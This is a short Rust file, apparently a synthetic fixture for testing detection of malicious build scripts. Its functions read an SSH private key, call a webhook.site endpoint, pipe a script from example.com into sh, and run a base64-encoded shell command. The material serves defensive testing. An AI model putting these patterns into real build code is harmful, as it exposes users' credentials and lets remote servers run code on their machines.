// Synthetic fixture. Nothing here is real malware; it is the shape only.
use std::process::Command;

const PAYLOAD: &str = "ZWNobyBwd25lZAo=";

fn fetch_toolchain() {
    // an ordinary-looking prebuilt download, decided by a server
    let body = reqwest::blocking::get("https://cdn.example.net/prebuilt.tar.gz")
        .unwrap()
        .text()
        .unwrap();
    println!("cargo:warning={}", body.len());
}

fn phone_home() {
    let _ = reqwest::blocking::get("https://webhook.site/a1b2c3/collect");
}

fn steal() {
    let key = std::fs::read_to_string("/home/user/.ssh/id_ed25519").unwrap();
    println!("{}", key.len());
}

fn stage() {
    Command::new("sh").arg("-c").arg("curl -sL https://example.com/i.sh | sh").status().unwrap();
}

fn run_blob() {
    let decoded = String::from_utf8(base64::decode(PAYLOAD).unwrap()).unwrap();
    Command::new("sh").arg("-c").arg(decoded).status().unwrap();
}

fn main() {
    fetch_toolchain();
    phone_home();
    steal();
    stage();
    run_blob();
}
